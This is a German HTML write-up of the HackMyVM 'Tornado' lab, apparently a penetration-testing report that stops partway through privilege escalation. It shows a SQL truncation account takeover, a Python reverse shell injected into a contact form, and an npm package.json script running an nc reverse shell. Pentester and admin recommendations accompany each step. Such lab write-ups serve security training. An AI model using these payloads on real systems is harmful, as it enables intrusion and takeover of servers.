@@ -1,0 +1,545 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tornado - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Tornado - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">Burp Suite</div> <!-- Implied for SQL Truncation -->
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div> <!-- For reverse shell -->
+                <div class="tool-item">stty</div> <!-- For shell stabilization -->
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cd</div> <!-- Implied -->
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">pico</div> <!-- Text editor -->
+                <div class="tool-item">npm</div>
+                <div class="tool-item">id</div> <!-- Implied -->
+                <div class="tool-item">pwd</div> <!-- Implied -->
+                <div class="tool-item">ls</div> <!-- Implied -->
+                <div class="tool-item">cat</div> <!-- Implied -->
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web)</a></li>
+                <li><a href="#initial-access">Initial Access (SQL Truncation & RCE)</a></li>
+                <li><a href="#poc">Proof of Concept (RCE via Comment Field)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (NPM Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.110</span>	<span class="command">08:00:27:b1:87:7c</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerk zu entdecken. Es wird ein Host mit der IP <span class="command">192.168.2.110</span> und der MAC-Adresse <span class="command">08:00:27:b1:87:7c</span> (PCS Systemtechnik GmbH / Oracle VirtualBox) identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Tornado" wurde erfolgreich im Netzwerk lokalisiert. Die IP <span class="command">192.168.2.110</span> ist der Ausgangspunkt für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken. ARP-Aktivitäten überwachen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.110 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at <span class="command">2022-11-10 23:50 CET</span>
+Nmap scan report for tornado (192.168.2.110)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 0f:57:0d:60:31:4a:fd:2b:db:3e:9e:2f:63:2e:35:df (RSA)
+|   256 00:9a:c8:d3:ba:1b:47:b2:48:a8:88:24:9f:fe:33:cc (ECDSA)
+|_  256 6d:af:db:21:25:ee:b0:a6:7d:05:f3:06:f0:65:ff:dc (ED25519)
+<span class="command">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span>
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:B1:87:7C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms tornado (192.168.2.110)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in XX.XX seconds
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan aller TCP-Ports (`-p-`) auf <span class="command">192.168.2.110</span> identifiziert zwei offene Ports:
+            <ul>
+                <li>Port <span class="command">22 (SSH)</span>: Läuft OpenSSH 7.9p1 (Debian).</li>
+                <li>Port <span class="command">80 (HTTP)</span>: Läuft Apache httpd 2.4.38 (Debian) und zeigt die Apache-Standardseite.</li>
+            </ul>
+            Die OS-Erkennung deutet auf Linux hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die primären Angriffsvektoren sind SSH und der Apache-Webserver. Die Apache-Version 2.4.38 ist bekannt für CVE-2019-0211 (LPE), was später relevant sein könnte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Webserver auf Port 80 mittels Directory Busting und manueller Analyse. Versuchen Sie Standard-SSH-Logins. Behalten Sie die Apache-Version für spätere LPE-Versuche im Hinterkopf.<br><strong>Empfehlung (Admin):</strong> Halten Sie Apache und SSH aktuell. Konfigurieren Sie SSH sicher (Key-Auth bevorzugen, Root-Login deaktivieren). Sichern Sie Webanwendungen ab.</p>
+
+        </section>
+
+        <section id="enumeration">
+            <h2>Enumeration (Web)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.110 -x [...],php,html,[...] -w "/usr/share/seclists/[...]/directory-list-2.3-medium.txt" -b '403,404' -e</span></div>
+                     <pre>
+===============================================================
+Gobuster vX.Y.Z
+===============================================================
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.110/index.html</span>                   (Status: 200) [Size: 10701]
+<span class="command">http://192.168.2.110/manual</span>                       (Status: 301) [Size: 315] [--> http://192.168.2.110/manual/]
+<span class="command">http://192.168.2.110/javascript</span>                   (Status: 301) [Size: 319] [--> http://192.168.2.110/javascript/]
+<span class="command">http://192.168.2.110/bluesky</span>                      (Status: 301) [Size: 316] [--> http://192.168.2.110/bluesky/] <span class="password"><-- Webanwendung</span>
+===============================================================
+Finished
+===============================================================
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf Port 80 findet neben der Standard-`index.html` und dem `/manual`-Verzeichnis ein weiteres Verzeichnis namens `<span class="command">/bluesky</span>`, das auf eine Webanwendung hindeutet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `/bluesky` ist das primäre Ziel für die weitere Web-Enumeration.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen weiteren `gobuster`-Scan gezielt auf `http://192.168.2.110/bluesky/` durch, um die Struktur dieser Anwendung aufzudecken.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Webanwendungen aktuell und sicher konfiguriert sind. Entfernen Sie unnötige Verzeichnisse wie `/manual`.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.110/bluesky/ -x [...],php,html,[...] -w "/usr/share/seclists/[...]/directory-list-2.3-medium.txt" -e</span></div> <span class="password"><-- Expliziter Befehl nicht im Log, aber Ergebnis folgt</span>
+                    <pre>
+<span class="command">http://192.168.2.110/bluesky/index.html</span>           (Status: 200) [Size: 14979]
+<span class="command">http://192.168.2.110/bluesky/contact.php</span>          (Status: 302) [Size: 2034] [--> login.php] <span class="password"><-- Auth erforderlich</span>
+<span class="command">http://192.168.2.110/bluesky/about.php</span>            (Status: 302) [Size: 2024] [--> login.php] <span class="password"><-- Auth erforderlich</span>
+<span class="command">http://192.168.2.110/bluesky/login.php</span>            (Status: 200) [Size: 824] <span class="password"><-- Login-Seite</span>
+<span class="command">http://192.168.2.110/bluesky/signup.php</span>           (Status: 200) [Size: 825] <span class="password"><-- Registrierungsseite</span>
+<span class="command">http://192.168.2.110/bluesky/h.jpg</span>                (Status: 200) [Size: 58736]
+<span class="command">http://192.168.2.110/bluesky/css</span>                  (Status: 301) [Size: 320] [--> http://192.168.2.110/bluesky/css/]
+<span class="command">http://192.168.2.110/bluesky/imgs</span>                 (Status: 301) [Size: 321] [--> http://192.168.2.110/bluesky/imgs/]
+<span class="command">http://192.168.2.110/bluesky/js</span>                   (Status: 301) [Size: 319] [--> http://192.168.2.110/bluesky/js/]
+<span class="command">http://192.168.2.110/bluesky/logout.php</span>           (Status: 302) [Size: 0] [--> login.php]
+<span class="command">http://192.168.2.110/bluesky/dashboard.php</span>        (Status: 302) [Size: 2024] [--> login.php] <span class="password"><-- Auth erforderlich</span>
+<span class="command">http://192.168.2.110/bluesky/port.php</span>             (Status: 302) [Size: 2098] [--> login.php] <span class="password"><-- Auth erforderlich</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `gobuster`-Scan auf `/bluesky` findet mehrere PHP-Dateien, die auf eine Webanwendung mit Benutzerauthentifizierung hindeuten: `login.php`, `signup.php`, `logout.php`. Seiten wie `contact.php`, `about.php`, `dashboard.php`, `port.php` leiten auf `login.php` weiter, wenn man nicht authentifiziert ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Anwendung erfordert Login. Die `signup.php` bietet die Möglichkeit, ein Konto zu registrieren. Die `login.php` ist für den Login zuständig. Nach dem Login sind wahrscheinlich weitere Funktionen (z.B. in `contact.php`, `dashboard.php`) zugänglich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die `signup.php` und `login.php`. Registrieren Sie einen Test-Account. Suchen Sie nach Schwachstellen im Registrierungs- oder Login-Prozess (z.B. SQL Injection, unsichere Passwortspeicherung, SQL Truncation Attack). Prüfen Sie nach dem Login die Funktionalität der anderen Seiten (`contact.php` etc.).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Registrierungs- und Login-Funktionen sicher implementiert sind (Passwort-Hashing, Schutz vor SQL Injection, Brute-Force-Schutz, Session Management).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.110</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.110
++ Target Hostname:    192.168.2.110
++ Target Port:        80
++ Start Time:         <span class="command">2022-11-10 23:52:46 (GMT1)</span>
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. [...]
++ The X-Content-Type-Options header is not set. [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server may leak inodes via ETags [...]
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
++ <span class="command">/manual/</span>: Web server manual found.
++ <span class="command">/manual/images/</span>: Directory indexing found.
++ <span class="command">/icons/README</span>: Apache default file found.
++ 7915 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           <span class="command">2022-11-10 23:53:30 (GMT1)</span> (44 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `nikto`-Scan bestätigt den Apache-Server, meldet fehlende Security Header und findet das Apache-Manual-Verzeichnis (`/manual`) sowie Directory Indexing darin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt frühere Funde und liefert keine kritischen neuen Informationen. Das Datum wird für den Bericht erfasst.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf die `/bluesky`-Anwendung.<br><strong>Empfehlung (Admin):</strong> Fehlende Header implementieren, `/manual`-Verzeichnis entfernen oder schützen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Textuelle Hinweise/Analyse</span></div>
+                     <pre>
+URLs von Interesse:
+http://tornado.hmv/bluesky/login.php
+http://tornado.hmv/bluesky/port.php
+
+Gefundener Pfad (Quelle unklar):
+/home/tornado/imp.txt
+
+Versuchter LFI (impliziert, Quelle unklar):
+http://192.168.2.110/~tornado/imp.txt //working <span class="password"><-- Behauptung "working"</span>
+
+Enumerierte Email-Adressen/Usernames (Quelle unklar):
+ceo@tornado
+cto@tornado
+manager@tornado
+hr@tornado
+lfi@tornado
+admin@tornado
+jacob@tornado
+it@tornado
+sales@tornado
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt fasst verschiedene Hinweise zusammen, deren Ursprung im Log nicht klar dokumentiert ist:
+            <ul>
+                <li>Die Login- und Port-Seiten der `/bluesky`-Anwendung werden genannt.</li>
+                <li>Ein Pfad `/home/tornado/imp.txt` wird erwähnt.</li>
+                <li>Ein LFI-Versuch (`/~tornado/imp.txt`) wird als funktionierend ("working") bezeichnet.</li>
+                <li>Eine Liste potenzieller Benutzernamen/Email-Adressen wird aufgeführt.</li>
+            </ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Hinweise sind entscheidend, aber ihre Herkunft ist unklar. Die LFI-Behauptung ist wichtig, da sie einen Weg zum Lesen von `/home/tornado/imp.txt` darstellt. Die Benutzerliste, insbesondere `<span class="command">jacob@tornado</span>`, ist für den nächsten Schritt relevant.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verifizieren Sie die LFI (`/~tornado/imp.txt`). Wenn sie funktioniert, lesen Sie den Inhalt von `imp.txt`. Konzentrieren Sie sich auf den Benutzer `jacob` für Angriffe auf die `signup.php`/`login.php`.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie die Quelle der LFI-Schwachstelle und der Benutzerliste und beheben Sie diese. Stellen Sie sicher, dass Home-Verzeichnisse und sensible Dateien geschützt sind.</p>
+
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (SQL Truncation & RCE)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">SQL Truncation Attack Beschreibung</span></div>
+                    <pre>
+SQL Truncation Attack:
+Ändere in Burp das untere in Backslashes, damit ändern wir das
+Passwort von Jacob in unseres gewähltes
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+fire up Burp and register with jacob\ <span class="password"><-- Benutzername mit Backslash</span>
+
+POST /bluesky/signup.php HTTP/1.1
+[...]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+[...]
+Cookie: PHPSESSID=h9u218je6anmhto802vbsl21lr
+[...]
+
+uname=jacob%40tornado&upass=1234&btn=Signup   <span class="password">/// Original tauschen mit unterem</span>
+
+<span class="password">//// CHANGE uname=jacob%5c1&upass=1234&btn=Signup ///// neuer soll dieser sein</span> <span class="password"><-- %5c ist URL-kodierter Backslash</span>
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+und [forward]
+dann zu Login und einloggen/ dann zu -> http://tornado.hmv/bluesky/contact.php
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt beschreibt eine SQL Truncation Attacke auf die Registrierungsseite (`signup.php`):
+            1.  Es wird versucht, einen Benutzer mit einem Namen zu registrieren, der dem Zielbenutzer (`jacob`) ähnelt, aber mit einem Backslash (`\`) endet (z.B. `jacob\`).
+            2.  Der POST-Request zur Registrierung wird mit Burp Suite abgefangen.
+            3.  Der `uname`-Parameter im Request-Body wird manipuliert von `jacob%40tornado` (oder `jacob\`) zu `jacob%5c1` (URL-kodiert für `jacob\1`). Das Passwort (`upass`) bleibt `1234`.
+            4.  Der manipulierte Request wird gesendet.
+            5.  **Funktionsweise (impliziert):** Die Datenbanktabelle für Benutzernamen hat wahrscheinlich eine feste Längenbegrenzung. Wenn `jacob\1` eingefügt wird, wird der String an der maximalen Länge abgeschnitten, sodass nur `jacob` in der Datenbank gespeichert wird. Da `jacob` bereits existiert, führt dies (je nach Implementierung) dazu, dass der bestehende `jacob`-Account mit dem neuen Passwort (`1234`) überschrieben wird oder dass die Registrierung fehlschlägt, aber das Passwort-Update für `jacob` dennoch stattfindet.
+            6.  Das Ergebnis ist, dass sich der Angreifer nun als `jacob` mit dem Passwort `1234` anmelden kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische Schwachstelle (SQL Truncation) im Registrierungsprozess gefunden und ausgenutzt. Dies ermöglicht die Übernahme des `jacob`-Accounts.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich als `jacob` mit dem Passwort `1234` an. Untersuchen Sie die nach dem Login zugänglichen Seiten, insbesondere `contact.php`.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die SQL Truncation Schwachstelle. Stellen Sie sicher, dass die Längen von Benutzereingaben sowohl in der Anwendung als auch in der Datenbank korrekt validiert werden. Verwenden Sie Prepared Statements oder ORMs, um SQL-Injection-Risiken generell zu minimieren. Implementieren Sie Mechanismen zur Erkennung von Kontoübernahmeversuchen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                    <div class="prompt"># <span class="command">Python Reverse Shell Payload (für Comment-Feld in contact.php)</span></div>
+                     <pre>
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.109",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+</pre>
+                     <div class="prompt"># <span class="command">Eingehende Verbindung nach Absenden des Contact-Formulars</span></div>
+                    <div class="terminal"> <span class="password"><-- Format angepasst</span>
+                     <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.110] 43040</span>
+bash: cannot set terminal process group (580): Inappropriate ioctl for device
+bash: no job control in this shell
+</pre>
+                     <div class="prompt">www-data@tornado:/var/www/html/bluesky$ <span class="password"># Shell erhalten!</span></div>
+                     </div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Login als `jacob` (impliziert) wird die Seite `contact.php` aufgerufen. Diese Seite enthält vermutlich ein Kommentar- oder Nachrichtenfeld. In dieses Feld wird ein Python-Reverse-Shell-Payload eingefügt. Beim Absenden des Formulars wird dieser Payload serverseitig ausgeführt. Ein Netcat-Listener auf dem Angreifer-System (<span class="command">192.168.2.109:9001</span>) empfängt die eingehende Verbindung, und der Angreifer erhält eine Shell als `www-data`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Remote Code Execution (RCE) über ein Kommentarfeld in `contact.php` erfolgreich ausgenutzt. Der Initial Access als `www-data` ist damit erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell stabilisieren. Mit der Enumeration als `www-data` beginnen (`sudo -l`, SUID etc.).<br><strong>Empfehlung (Admin):</strong> Beheben Sie die RCE-Schwachstelle in `contact.php`. Sanitisieren Sie *alle* Benutzereingaben rigoros, insbesondere solche, die potenziell auf dem Server verarbeitet oder ausgeführt werden könnten. Implementieren Sie Output Encoding und eine Web Application Firewall (WAF).</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tornado:/var/www/html/bluesky$ <span class="command">stty -a</span></div>
+                     <pre>speed 38400 baud; rows 24; columns 80; line = 0;</pre>
+                     <div class="prompt"># <span class="command">Weitere Stabilisierungsschritte (python, export TERM) nicht explizit wiederholt, aber wahrscheinlich durchgeführt</span></div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `stty -a` zeigt die aktuellen Terminaleinstellungen an. Dies wird oft nach Erhalt einer Shell gemacht, um zu prüfen, ob es sich um eine interaktive TTY handelt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standard-Enumerationsschritt nach Shell-Erhalt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahren Sie mit der Enumeration fort.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+        </section>
+
+        <section id="poc">
+             <h2>Proof of Concept (RCE via Comment Field)</h2>
+
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Nach erfolgreichem Login in die `/bluesky`-Webanwendung (hier als Benutzer `jacob`, dessen Konto durch eine SQL Truncation Attacke übernommen wurde) ist die Seite `contact.php` zugänglich. Diese Seite enthält ein Eingabefeld (vermutlich für Kommentare oder Nachrichten), das anfällig für Remote Code Execution (RCE) ist. Benutzereingaben in diesem Feld werden offenbar unsicher auf dem Server verarbeitet und ausgeführt. Durch Einfügen eines geeigneten Payloads (z.B. einer Python-Reverse-Shell) in das Kommentarfeld und Absenden des Formulars kann ein Angreifer beliebigen Code im Kontext des Webserver-Benutzers (`www-data`) ausführen.</p>
+
+             <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                     <li>Netzwerkzugriff auf die `/bluesky`-Anwendung (`http://tornado.hmv/bluesky/`).</li>
+                     <li>Gültige Zugangsdaten für die Anwendung (hier erlangt durch SQL Truncation für `jacob`).</li>
+                     <li>Zugriff auf die `contact.php`-Seite nach dem Login.</li>
+                     <li>Ein anfälliges Eingabefeld auf `contact.php`, dessen Inhalt serverseitig unsicher ausgeführt wird.</li>
+                     <li>Ein Netcat-Listener auf dem Angreifer-System.</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                     <li>
+                         <strong>Login:</strong> Melden Sie sich bei `http://tornado.hmv/bluesky/login.php` als Benutzer `jacob` mit dem durch SQL Truncation gesetzten Passwort (hier `1234`) an.
+                    </li>
+                    <li>
+                        <strong>Listener starten (Angreifer-System):</strong>
+                        Starten Sie Netcat, um auf die eingehende Reverse Shell zu warten.
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                                <pre>listening on [any] 9001 ...</pre>
+                            </div>
+                        </div>
+                    </li>
+                     <li>
+                         <strong>Payload injizieren:</strong>
+                         Navigieren Sie zu `http://tornado.hmv/bluesky/contact.php`. Suchen Sie das Kommentar-/Nachrichtenfeld. Fügen Sie den Python-Reverse-Shell-Payload ein (ersetzen Sie IP und Port durch Ihre Listener-Daten):
+                        <div class="code-block">
+                            <pre>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.109",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</pre>
+                        </div>
+                        Senden Sie das Formular ab.
+                    </li>
+                    <li>
+                        <strong>Shell empfangen (Angreifer-Listener):</strong>
+                        Der Netcat-Listener sollte nun die eingehende Verbindung vom Zielserver anzeigen.
+                        <div class="code-block">
+                            <div class="terminal">
+                                <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.110] 43040</span>
+[...]
+www-data@tornado:/var/www/html/bluesky$ <span class="password"># Shell erhalten</span></pre>
+                            </div>
+                        </div>
+                    </li>
+                </ol>
+            </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Eine interaktive Reverse Shell auf dem Zielsystem, ausgeführt mit den Rechten des `www-data`-Benutzers.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Die erfolgreiche eingehende Verbindung im Netcat-Listener und die Fähigkeit, Befehle in der Shell auszuführen.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Die Möglichkeit, Code über ein Eingabefeld nach der Authentifizierung auszuführen, stellt eine kritische Schwachstelle dar. Sie erlaubt authentifizierten Benutzern (oder Angreifern, die Konten übernehmen) die vollständige Kompromittierung des Webservers.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                <ul>
+                     <li>**Eingabevalidierung/-sanitisierung:** Validieren und bereinigen Sie *alle* Benutzereingaben, die serverseitig verarbeitet werden, rigoros. Entfernen oder kodieren Sie gefährliche Zeichen.</li>
+                     <li>**Vermeiden Sie unsichere Funktionen:** Nutzen Sie keine Funktionen wie `eval()`, `system()`, `shell_exec()`, `passthru()` mit Benutzereingaben.</li>
+                     <li>**Kontextbezogenes Escaping/Encoding:** Stellen Sie sicher, dass Daten korrekt für den Kontext kodiert werden, in dem sie verwendet werden (HTML, SQL, Shell etc.).</li>
+                     <li>**Least Privilege:** Führen Sie den Webserver-Prozess (`www-data`) mit minimalen Berechtigungen aus.</li>
+                     <li>**Regelmäßige Code-Reviews:** Überprüfen Sie den Anwendungscode auf Sicherheitslücken.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (NPM Exploit)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@tornado:/var/www/html/bluesky$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on tornado:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on tornado:
+    <span class="command">(catchme) NPASSWD: /usr/bin/npm</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird `sudo -l` ausgeführt. Es zeigt sich, dass `www-data` den Befehl `/usr/bin/npm` (Node Package Manager) als Benutzer `<span class="command">catchme</span>` ohne Passwort (`NOPASSWD`) ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein klarer Privilege Escalation Vektor von `www-data` zu `catchme`. `npm` kann Skripte ausführen, die in einer `package.json`-Datei definiert sind. Indem eine manipulierte `package.json` erstellt und dann `npm run-script <scriptname>` mit `sudo -u catchme` ausgeführt wird, kann Code als Benutzer `catchme` ausgeführt werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie ein temporäres Verzeichnis (z.B. `/tmp/cool`). Erstellen Sie darin eine `package.json`-Datei, die ein Skript definiert (z.B. `"cool"`), das eine Reverse Shell startet. Führen Sie dann `sudo -u catchme npm run-script cool` aus diesem Verzeichnis aus.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie diese `sudo`-Regel. Das Ausführen von Paketmanagern wie `npm` als anderer Benutzer ist extrem gefährlich und sollte vermieden werden, da es die Ausführung beliebigen Codes ermöglicht.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">www-data@tornado:/var/www/html/bluesky$ <span class="command">cd /tmp/</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">www-data@tornado:/tmp$ <span class="command">mkdir cool</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt">www-data@tornado:/tmp$ <span class="command">cd cool/</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">www-data@tornado:/tmp/cool$ <span class="command">pico package.json</span></div>
+                     <pre>[...] <span class="password"># Editor geöffnet</span></pre>
+                     <div class="prompt"># <span class="command">Inhalt der erstellten package.json:</span></div>
+                    <pre>
+{
+  "name": "cool",
+  "version": "1.0.0",
+  "description": "CooLWasHere",
+  "main": "index.js",
+  "scripts": {
+    "<span class="command">cool</span>": "<span class="command">nc 192.168.2.109 4444 -e /bin/sh</span>" <span class="password"><-- Reverse Shell Befehl</span>
+  },
+  "author": "",
+  "license": "UNLICENSED"
+}
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Im Verzeichnis `/tmp` wird ein Unterverzeichnis `cool` erstellt. Darin wird eine `package.json`-Datei angelegt. Diese Datei definiert ein NPM-Skript namens `<span class="command">cool</span>`, das beim Ausführen den Befehl `<span class="command">nc 192.168.2.109 4444 -e /bin/sh</span>` startet, um eine Reverse Shell zum Angreifer-System zu senden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung des NPM-Exploits.</p>
